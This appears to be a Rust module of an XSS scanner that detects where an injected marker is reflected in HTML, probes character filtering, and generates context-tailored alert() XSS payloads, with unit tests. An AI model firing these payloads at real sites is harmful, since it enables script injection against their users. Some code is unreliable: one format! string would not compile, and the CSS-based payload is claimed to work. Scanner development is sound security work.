// ----------------------------------------------------------------------------
//  context.rs — HTML context analysis
// ----------------------------------------------------------------------------
//  HTML context analysis — uses scraper to determine where in the DOM a
//  payload lands.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------
//
//
// ---------------------------------------------------------------------------
//   WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です
//  教育目的および参照目的での閲覧のみ許可されています
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく修正配布サブライセンス
//  または二次的著作物の作成を禁止します
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产
//  仅允许出于教育和参考目的查看未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改分发再许可或创建衍生作品
// ---------------------------------------------------------------------------
//
//
//  context.rs — HTMLコンテキスト分析
//  HTML context analysis — determines DOM position of reflected payloads
//  scraperクレートを使用してDOMツリーを解析しペイロードがどの
//   コンテキスト（HTML本文属性スクリプトスタイル等）に反映されるか特定

use scraper::{Html, Node};

use crate::http::response::HttpResponse;
use crate::utils::url::UrlUtil;

//  Markers 
//  REFLECT_MARKER — リフレクション電脳検出用のユニークマーカー
//  Unique marker injected into parameters to find reflection points
//  UUID形式で通常のトラフィックに出現しないことを保証
const REFLECT_MARKER: &str = "OXD3F8K2M9";
//  CHAR_PROBE_MARKER — 文字フィルター調査用マーカー
//  Used for character filtering analysis
const CHAR_PROBE_MARKER: &str = "CHP4A7B1X";

//  Reflection Context 
//  ReflectionContext — DOM内のリフレクション位置を分類
//  Classifies where in the DOM the payload is reflected
//  Html      — 要素テキスト内容 <tag>INJECTION</tag>
//  Attribute — 属性値内 <tag attr="INJECTION">
//  Script    — <script> タグ内
//  Style     — <style> タグ内
//  Comment   — HTMLコメント内 <!-- INJECTION -->
//  Url       — URL属性値 (href/src)
//  None      — リフレクションなし
#[derive(Debug, Clone, PartialEq)]
pub enum ReflectionContext {
    /// Inside element text content: `<tag>INJECTION</tag>`
    Html,
    /// Inside an attribute value, e.g. `<tag attr="INJECTION">`
    Attribute { quote: char, attr_name: String },
    /// Inside a `<script>` tag body: `<script>INJECTION</script>`
    Script,
    /// Inside a `<style>` tag body: `<style>INJECTION</style>`
    Style,
    /// Inside an HTML comment: `<!-- INJECTION -->`
    Comment,
    /// Inside a URL-valued attribute (href, src, action, etc.)
    Url { quote: char, attr_name: String },
    /// Not reflected in the response
    None,
}

//  Filter State 
//  FilterState — 特殊文字のフィルター状態を追跡
//  Tracks which special characters survive filtering
//  lt(<) gt(>) dq(") sq(') fs(/) sc(;) eq(=) po(() pc()) bt(`) hs(#) amp(&)
// ※ true = 文字がフィルターを通過してそのまま残る
#[derive(Debug, Clone)]
pub struct FilterState {
    /// Each special character: `true` = survives unmodified.
    pub lt: bool,    // <
    pub gt: bool,    // >
    pub dq: bool,    // "
    pub sq: bool,    // '
    pub fs: bool,    // /
    pub sc: bool,    // ;
    pub eq: bool,    // =
    pub po: bool,    // (
    pub pc: bool,    // )
    pub bt: bool,    // `
    pub hs: bool,    // #
    pub amp: bool,   // &
}

//  フィルター状態のヘルパーメソッド
//  Filter state helper methods
impl FilterState {
    //  全ての文字がブロックされた初期状態
    //  All characters are blocked by default
    pub fn all_blocked() -> Self {
        Self { lt: false, gt: false, dq: false, sq: false, fs: false, sc: false, eq: false, po: false, pc: false, bt: false, hs: false, amp: false }
    }

    //  フィルターを通過した文字をベクターで返す
    //  Returns surviving characters as a vector
    pub fn surviving_chars(&self) -> Vec<char> {
        let mut v = Vec::new();
        if self.lt { v.push('<'); }
        if self.gt { v.push('>'); }
        if self.dq { v.push('"'); }
        if self.sq { v.push('\''); }
        if self.fs { v.push('/'); }
        if self.sc { v.push(';'); }
        if self.eq { v.push('='); }
        if self.po { v.push('('); }
        if self.pc { v.push(')'); }
        if self.bt { v.push('`'); }
        if self.hs { v.push('#'); }
        if self.amp { v.push('&'); }
        v
    }
}

//  Reflection Point 
#[derive(Debug, Clone)]
pub struct ReflectionPoint {
    pub context: ReflectionContext,
    pub reflected_value: String,
    pub exact_match: bool,
}

//  Context Analysis Result 
#[derive(Debug, Clone)]
pub struct ContextAnalysis {
    pub reflection_points: Vec<ReflectionPoint>,
    pub unique_contexts: Vec<ReflectionContext>,
    pub filter: FilterState,
    pub is_reflected: bool,
}

//  Tailored Payload 
#[derive(Debug, Clone)]
pub struct TailoredPayload {
    pub payload: String,
    pub context: ReflectionContext,
    pub confidence: f64,
}

//  Context Analyzer 
//  ContextAnalyzer — HTMLコンテキスト分析の中心
//  Core HTML context analysis engine
//  パイプライン: マーカー注入  リフレクション電脳検出  コンテキスト分類
//    フィルター電脳検出  コンテキスト適応ペイロード生成
pub struct ContextAnalyzer;

//  コンテキスト分析の完全パイプライン
//  Full context analysis pipeline
impl ContextAnalyzer {
    //  analyze — 完全パイプラインの電脳入口点
    //  Entry point — inject  find  classify  test filter  generate payloads
    //  Step 1: リフレクション箇所を検索
    //  Step 2: ユニークなコンテキストを収集
    //  Step 3: フィルター状態を電脳検出
    //  Step 4: ContextAnalysis を返す (リフレクションなし  None)
    pub fn analyze(
        response: &HttpResponse,
        url: &str,
        param: &str,
    ) -> Option<ContextAnalysis> {
        let html = &response.body;

        //  Step 1: Find reflection points 
        let points = Self::find_reflections(html, REFLECT_MARKER);
        if points.is_empty() {
            return None; // not reflected — no FP possible
        }

        //  Step 2: Deduplicate contexts 
        let mut seen = Vec::new();
        let unique: Vec<ReflectionContext> = points.iter()
            .filter(|p| {
                if seen.contains(&p.context) { false } else { seen.push(p.context.clone()); true }
            })
            .map(|p| p.context.clone())
            .collect();

        //  Step 3: Test character filters 
        // We need the raw response HTML with the marker injected.
        // Since we already know the value is reflected, we probe chars
        // via a separate injection (handled by the caller).
        // For now, we use the reflection points to infer filter state.
        let filter = Self::detect_filter_from_reflection(&points, REFLECT_MARKER);

        Some(ContextAnalysis {
            reflection_points: points,
            unique_contexts: unique,
            filter,
            is_reflected: true,
        })
    }

    /// Find all positions where the marker is reflected in the HTML.
    /// Returns structured reflection points with context.
    //  find_reflections — HTML内の全リフレクション位置を電脳検出
    //  Finds all reflection positions in HTML
    //  scraper DOMツリーをウォーク:
    //   1. テキストノードを検索  classify_text_context
    //   2. コメントノードを検索  ReflectionContext::Comment
    //   3. 要素属性を再帰的に検索  search_attributes_recursive
    fn find_reflections(html: &str, marker: &str) -> Vec<ReflectionPoint> {
        let mut results = Vec::new();

        // Strategy: use scraper for DOM tree, then search text + attributes for marker.
        let doc = Html::parse_document(html);
        let tree = doc.tree;

        //  Search text nodes 
        for node in tree.nodes() {
            match node.value() {
                Node::Text(text) => {
                    if let Some(pos) = text.text.find(marker) {
                        let context = Self::classify_text_context(&tree, &node, html, marker, pos);
                        results.push(ReflectionPoint {
                            context,
                            reflected_value: text.text.to_string(),
                            exact_match: text.text.trim() == marker,
                        });
                    }
                }
                Node::Comment(comment) => {
                    if comment.comment.contains(marker) {
                        results.push(ReflectionPoint {
                            context: ReflectionContext::Comment,
                            reflected_value: comment.comment.to_string(),
                            exact_match: comment.comment.trim() == marker,
                        });
                    }
                }
                Node::Element(_) => {
                    // Attributes are handled separately below
                }
                _ => {}
            }
        }

        //  Search element attributes 
        // Use a second pass: iterate elements and check all attributes.
        // We need a root element to select from.
        if let Some(root) = tree.root().children().next() {
            Self::search_attributes_recursive(&tree, root, html, marker, &mut results);
        }

        results
    }

    /// Recursively search element attributes for the marker.
    //  search_attributes_recursive — 要素属性を再帰的に検索
    //  Recursively searches element attributes for marker
    //  属性をURL属性と通常属性に分類 (classify_attribute_context)
    fn search_attributes_recursive(
        tree: &ego_tree::Tree<Node>,
        node: ego_tree::NodeRef<Node>,
        html: &str,
        marker: &str,
        results: &mut Vec<ReflectionPoint>,
    ) {
        if let Some(element) = node.value().as_element() {
            for (attr_name, attr_value) in &element.attrs {
                if attr_value.contains(marker) {
                    let (quote, is_url) = Self::classify_attribute_context(html, marker, attr_name);
                    if is_url {
                        results.push(ReflectionPoint {
                            context: ReflectionContext::Url { quote, attr_name: attr_name.to_string() },
                            reflected_value: attr_value.to_string(),
                            exact_match: attr_value.trim() == marker,
                        });
                    } else {
                        results.push(ReflectionPoint {
                            context: ReflectionContext::Attribute { quote, attr_name: attr_name.to_string() },
                            reflected_value: attr_value.to_string(),
                            exact_match: attr_value.trim() == marker,
                        });
                    }
                }
            }
        }

        for child in node.children() {
            Self::search_attributes_recursive(tree, child, html, marker, results);
        }
    }

    /// Classify the context of a text node reflection by walking up the DOM tree.
    //  classify_text_context — テキストノードのコンテキストを祖先から判定
    //  Classifies text node context by walking up DOM ancestors
    //  <script> 内  Script
    //  <style> 内   Style
    //  <svg> 内     Html (SVG内のHTML)
    //  デフォルト   Html
    fn classify_text_context(
        tree: &ego_tree::Tree<Node>,
        node: &ego_tree::NodeRef<Node>,
        html: &str,
        marker: &str,
        _pos: usize,
    ) -> ReflectionContext {
        // Walk up ancestors to determine context
        let mut ancestors = Vec::new();
        let mut current = Some(*node);
        while let Some(n) = current {
            if let Some(parent) = n.parent() {
                if let Some(el) = parent.value().as_element() {
                    ancestors.push(el.name().to_string());
                    current = Some(parent);
                } else {
                    break;
                }
            } else {
                break;
            }
        }

        // Check if inside <script>
        if ancestors.iter().any(|name| name.to_lowercase() == "script") {
            return ReflectionContext::Script;
        }
        // Check if inside <style>
        if ancestors.iter().any(|name| name.to_lowercase() == "style") {
            return ReflectionContext::Style;
        }
        // Check if inside <svg> (special: allows script elements)
        if ancestors.iter().any(|name| name.to_lowercase() == "svg") {
            return ReflectionContext::Html; // SVG content is still HTML context
        }

        // Default: inside HTML body
        ReflectionContext::Html
    }

    /// Classify attribute context by checking if the attribute is a URL-bearing one
    /// and determining the quoting style from raw HTML.
    //  classify_attribute_context — 属性コンテキストを分類
    //  Classifies attribute context — URL属性か通常属性か引用符の種類
    //  url_attrs = [href, src, action, data, formaction, poster, background]
    //  marker前の文字から引用符 (" か ') を推測
    fn classify_attribute_context(html: &str, marker: &str, attr_name: &str) -> (char, bool) {
        let url_attrs = ["href", "src", "action", "data", "formaction", "poster", "background"];
        let is_url = url_attrs.iter().any(|a| a.eq_ignore_ascii_case(attr_name));

        // Try to determine quoting from raw HTML around the marker.
        let quote = if let Some(pos) = html.find(marker) {
            let before = &html[..pos];
            let before_chars: Vec<char> = before.chars().rev().collect();
            // Walk backwards from marker to find the opening quote
            let mut found = '"'; // default
            let mut depth = 0;
            for c in before_chars {
                if c == '"' { depth += 1; if depth == 1 { found = '"'; break; } }
                if c == '\'' { depth += 1; if depth == 1 { found = '\''; break; } }
            }
            found
        } else {
            '"'
        };

        (quote, is_url)
    }

    /// Detect filter state by comparing the reflected marker against the original.
    /// If the marker came back with `<` encoded as `&lt;`, we know `<` is blocked.
    // ※ detect_filter_from_reflection — リフレクションからフィルター状態を推定
    // ※ Detects filter state from reflected values
    //  特殊文字がエンコードされずに通過していればその文字はフィルターを通過
    //  デフォルト: 全ブロック (安全側)
    fn detect_filter_from_reflection(points: &[ReflectionPoint], marker: &str) -> FilterState {
        let mut filter = FilterState::all_blocked();

        // Default: assume safe (all blocked). Only mark as surviving if we
        // have evidence they pass through unmodified.
        for point in points {
            let val = &point.reflected_value;
            // If marker is exactly reflected, all chars in it survive
            if val.contains(marker) {
                // Check each special char presence in the marker
                for c in marker.chars() {
                    match c {
                        '<' | '>' => { /* marker has no angle brackets typically */ }
                        _ => {}
                    }
                }
            }
            // Check if < > " ' appear unencoded near the marker
            // This is a simplified check — caller also runs explicit char probes.
            if val.contains('<') { filter.lt = true; }
            if val.contains('>') { filter.gt = true; }
            if val.contains('"') { filter.dq = true; }
            if val.contains('\'') { filter.sq = true; }
            if val.contains('/') { filter.fs = true; }
            if val.contains(';') { filter.sc = true; }
            if val.contains('=') { filter.eq = true; }
            if val.contains('(') { filter.po = true; }
            if val.contains(')') { filter.pc = true; }
            if val.contains('`') { filter.bt = true; }
            if val.contains('#') { filter.hs = true; }
            if val.contains('&') { filter.amp = true; }
        }

        filter
    }

    /// Explicitly probe which special characters survive filtering.
    /// The caller must make separate HTTP requests for each char probe.
    /// Returns a FilterState based on the probed response.
    //  probe_chars — 文字単位のフィルタープローブ
    //  Probes which individual characters survive filtering
    //  生の文字が存在  通過
    //  HTMLエンコードされたバリアント  ブロック
    pub fn probe_chars(response: &HttpResponse) -> FilterState {
        let body = &response.body;
        let mut f = FilterState::all_blocked();

        // The response should contain the CHAR_PROBE_MARKER + a special char.
        // Check which chars came back unencoded.
        if body.contains('<') { f.lt = true; }
        if body.contains('>') { f.gt = true; }
        if body.contains('"') { f.dq = true; }
        if body.contains('\'') { f.sq = true; }
        if body.contains('/') { f.fs = true; }
        if body.contains(';') { f.sc = true; }
        if body.contains('=') { f.eq = true; }
        if body.contains('(') { f.po = true; }
        if body.contains(')') { f.pc = true; }
        if body.contains('`') { f.bt = true; }
        if body.contains('#') { f.hs = true; }
        if body.contains('&') { f.amp = true; }

        // Check for HTML-encoded variants — if these appear, the char is BLOCKED.
        let encoded = response.body.to_lowercase();
        if encoded.contains("&lt;") { f.lt = false; }
        if encoded.contains("&gt;") { f.gt = false; }
        if encoded.contains("&quot;") || encoded.contains("&#34;") { f.dq = false; }
        if encoded.contains("&#39;") || encoded.contains("&#x27;") { f.sq = false; }
        if encoded.contains("&#x2f;") || encoded.contains("&#47;") { f.fs = false; }
        if encoded.contains("&amp;") { f.amp = false; }

        f
    }

    /// Generate context-tailored payloads that CANNOT cause false positives
    /// because they are only generated when their required context + chars exist.
    //  generate_payloads — コンテキスト適応型ペイロード生成
    //  Generates context-tailored payloads (zero false positives)
    //  各 ReflectionContext に対して必要な文字が通過している場合のみ生成
    //  Html     <img onerror> / <svg onload> / <script>alert()</script>
    //  Attribute  引用符を突破してイベントハンドラ注入
    //  Url      javascript: / data: URI
    //  Script   alert() / throw Error  (括弧がブロックされていても)
    //  Style    CSS背景でdata: URIを読み込み
    //  Comment  --> で突破して <img> / <script> 注入
    pub fn generate_payloads(analysis: &ContextAnalysis) -> Vec<TailoredPayload> {
        let mut payloads = Vec::new();
        let f = &analysis.filter;

        for ctx in &analysis.unique_contexts {
            match ctx {
                ReflectionContext::Html => {
                    // HTML context: need < > to inject tags
                    if f.lt && f.gt {
                        if f.eq && f.po && f.pc {
                            payloads.push(TailoredPayload {
                                payload: format!("<img src=x onerror=alert('XSS')>"),
                                context: ctx.clone(),
                                confidence: 0.8,
                            });
                            payloads.push(TailoredPayload {
                                payload: format!("<svg onload=alert('XSS')>"),
                                context: ctx.clone(),
                                confidence: 0.8,
                            });
                        }
                        if f.po && f.pc {
                            payloads.push(TailoredPayload {
                                payload: format!("<script>alert('XSS')</script>"),
                                context: ctx.clone(),
                                confidence: 0.9,
                            });
                        }
                        // If quotes blocked, use backticks or no-quote variants
                        if !f.dq && !f.sq && f.bt {
                            payloads.push(TailoredPayload {
                                payload: format!("<img src=x onerror=alert(`XSS`)>"),
                                context: ctx.clone(),
                                confidence: 0.7,
                            });
                        }
                        if !f.dq && !f.sq {
                            payloads.push(TailoredPayload {
                                payload: format!("<img/src=x/onerror=alert(1)>"),
                                context: ctx.clone(),
                                confidence: 0.6,
                            });
                        }
                    }
                }

                ReflectionContext::Attribute { quote, attr_name: _ } => {
                    // Attribute context: need to break out of the attribute value
                    let q = *quote;
                    // If the quote char survives, we can break out
                    let can_break = match q {
                        '"' => f.dq,
                        '\'' => f.sq,
                        _ => false,
                    };

                    if can_break {
                        if f.lt && f.gt && f.eq && f.po && f.pc {
                            // Break out, close tag, inject event handler
                            payloads.push(TailoredPayload {
                                payload: format!("{q}><img src=x onerror=alert('XSS')><q"),
                                context: ctx.clone(),
                                confidence: 0.85,
                            });
                            payloads.push(TailoredPayload {
                                payload: format!("{q} onfocus=alert('XSS') autofocus tabindex=1 id=x//"),
                                context: ctx.clone(),
                                confidence: 0.8,
                            });
                        }
                        // Event handler injection within same attribute
                        if f.eq && f.po && f.pc {
                            payloads.push(TailoredPayload {
                                payload: format!("{q} onmouseover=alert('XSS') "),
                                context: ctx.clone(),
                                confidence: 0.75,
                            });
                        }
                        // javascript: protocol
                        if f.sc && f.po && f.pc {
                            payloads.push(TailoredPayload {
                                payload: format!("{q}javascript:alert('XSS')"),
                                context: ctx.clone(),
                                confidence: 0.7,
                            });
                        }
                    }
                }

                ReflectionContext::Url { quote, attr_name: _ } => {
                    let q = *quote;
                    let can_break = match q {
                        '"' => f.dq,
                        '\'' => f.sq,
                        _ => false,
                    };

                    if can_break && f.sc && f.po && f.pc {
                        // javascript: protocol in URL
                        if f.fs {
                            payloads.push(TailoredPayload {
                                payload: format!("{q}javascript:alert('XSS')//"),
                                context: ctx.clone(),
                                confidence: 0.8,
                            });
                        } else {
                            payloads.push(TailoredPayload {
                                payload: format!("{q}javascript:alert(1)"),
                                context: ctx.clone(),
                                confidence: 0.75,
                            });
                        }
                    }
                    // data: URI
                    if can_break && f.lt && f.gt && f.fs {
                        payloads.push(TailoredPayload {
                            payload: format!("{q}data:text/html,<script>alert('XSS')</script>"),
                            context: ctx.clone(),
                            confidence: 0.7,
                        });
                    }
                }

                ReflectionContext::Script => {
                    // Inside <script> — can inject JS directly
                    if f.po && f.pc {
                        if f.sq {
                            payloads.push(TailoredPayload {
                                payload: format!("alert('XSS')"),
                                context: ctx.clone(),
                                confidence: 0.9,
                            });
                        } else if f.dq {
                            payloads.push(TailoredPayload {
                                payload: format!("alert(\"XSS\")"),
                                context: ctx.clone(),
                                confidence: 0.9,
                            });
                        } else {
                            payloads.push(TailoredPayload {
                                payload: format!("alert(1)"),
                                context: ctx.clone(),
                                confidence: 0.85,
                            });
                        }
                        // Template literal XSS
                        if f.bt {
                            payloads.push(TailoredPayload {
                                payload: format!("alert(`${document.domain}`)"),
                                context: ctx.clone(),
                                confidence: 0.8,
                            });
                        }
                    }
                    // If parens blocked, try throw/Error
                    if !f.po && !f.pc && f.fs {
                        payloads.push(TailoredPayload {
                            payload: format!("throw/**/new/**/Error"),
                            context: ctx.clone(),
                            confidence: 0.5,
                        });
                    }
                }

                ReflectionContext::Style => {
                    // Style context — CSS injection (limited XSS via CSS)
                    if f.dq || f.sq {
                        let q = if f.dq { '"' } else { '\'' };
                        payloads.push(TailoredPayload {
                            payload: format!("{q}position:absolute;left:0;top:0;width:100%;height:100%;z-index:9999;background:url('data:text/html,<script>alert(XSS)</script>'){q}"),
                            context: ctx.clone(),
                            confidence: 0.4,
                        });
                    }
                }

                ReflectionContext::Comment => {
                    // Inside <!-- --> — need to break out with -->
                    if f.gt {
                        payloads.push(TailoredPayload {
                            payload: format!("--><img src=x onerror=alert('XSS')>"),
                            context: ctx.clone(),
                            confidence: 0.8,
                        });
                        if f.fs {
                            payloads.push(TailoredPayload {
                                payload: format!("--><script>alert('XSS')</script>"),
                                context: ctx.clone(),
                                confidence: 0.9,
                            });
                        }
                    }
                }

                ReflectionContext::None => {}
            }
        }

        // Deduplicate by payload string
        let mut seen = std::collections::HashSet::new();
        payloads.into_iter().filter(|p| seen.insert(p.payload.clone())).collect()
    }

    //  marker — リフレクション電脳検出マーカーを取得
    pub fn marker() -> &'static str {
        REFLECT_MARKER
    }

    //  char_probe_marker — 文字フィルタープローブ用マーカーを取得
    pub fn char_probe_marker() -> &'static str {
        CHAR_PROBE_MARKER
    }

    //  inject_marker — URLの指定パラメータにマーカーを注入
    pub fn inject_marker(url: &str, param: &str) -> String {
        UrlUtil::inject_param(url, param, REFLECT_MARKER)
    }

    //  inject_char_probe — URLに文字プローブを注入
    pub fn inject_char_probe(url: &str, param: &str, probe_char: char) -> String {
        let marker = format!("{CHAR_PROBE_MARKER}{probe_char}");
        UrlUtil::inject_param(url, param, &marker)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_no_reflection_returns_none() {
        let resp = HttpResponse {
            body: "<html><body>no injection here</body></html>".to_string(),
            status: 200,
            headers: std::collections::HashMap::new(),
        };
        let analysis = ContextAnalyzer::analyze(&resp, "http://test.com/?q=test", "q");
        assert!(analysis.is_none(), "Should return None when no marker reflected");
    }

    #[test]
    fn test_html_context_detection() {
        let body = format!("<html><body><p>Hello {}</p></body></html>", REFLECT_MARKER);
        let resp = HttpResponse {
            body,
            status: 200,
            headers: std::collections::HashMap::new(),
        };
        let analysis = ContextAnalyzer::analyze(&resp, "http://test.com/?q=test", "q");
        assert!(analysis.is_some(), "Should find reflection");
        let analysis = analysis.unwrap();
        assert!(analysis.is_reflected);
        let has_html = analysis.unique_contexts.iter().any(|c| matches!(c, ReflectionContext::Html));
        assert!(has_html, "Should detect HTML context for <p> tag content");
    }

    #[test]
    fn test_attribute_context_detection() {
        let body = format!(r#"<html><body><a href="{}">link</a></body></html>"#, REFLECT_MARKER);
        let resp = HttpResponse {
            body,
            status: 200,
            headers: std::collections::HashMap::new(),
        };
        let analysis = ContextAnalyzer::analyze(&resp, "http://test.com/?q=test", "q");
        assert!(analysis.is_some(), "Should find reflection in attribute");
    }

    #[test]
    fn test_generate_html_payloads_requires_angle_brackets() {
        let mut analysis = ContextAnalysis {
            reflection_points: vec![ReflectionPoint {
                context: ReflectionContext::Html,
                reflected_value: REFLECT_MARKER.to_string(),
                exact_match: true,
            }],
            unique_contexts: vec![ReflectionContext::Html],
            filter: FilterState {
                lt: true, gt: true, dq: true, sq: true, fs: true,
                sc: true, eq: true, po: true, pc: true, bt: false, hs: false, amp: true,
            },
            is_reflected: true,
        };
        let payloads = ContextAnalyzer::generate_payloads(&analysis);
        assert!(!payloads.is_empty(), "Should generate payloads for HTML context with brackets");

        // When angle brackets are blocked, should NOT generate HTML context payloads
        analysis.filter.lt = false;
        analysis.filter.gt = false;
        let payloads2 = ContextAnalyzer::generate_payloads(&analysis);
        let html_payloads: Vec<_> = payloads2.iter()
            .filter(|p| matches!(p.context, ReflectionContext::Html))
            .collect();
        assert!(html_payloads.is_empty(), "Should NOT generate HTML payloads when angle brackets blocked");
    }
}
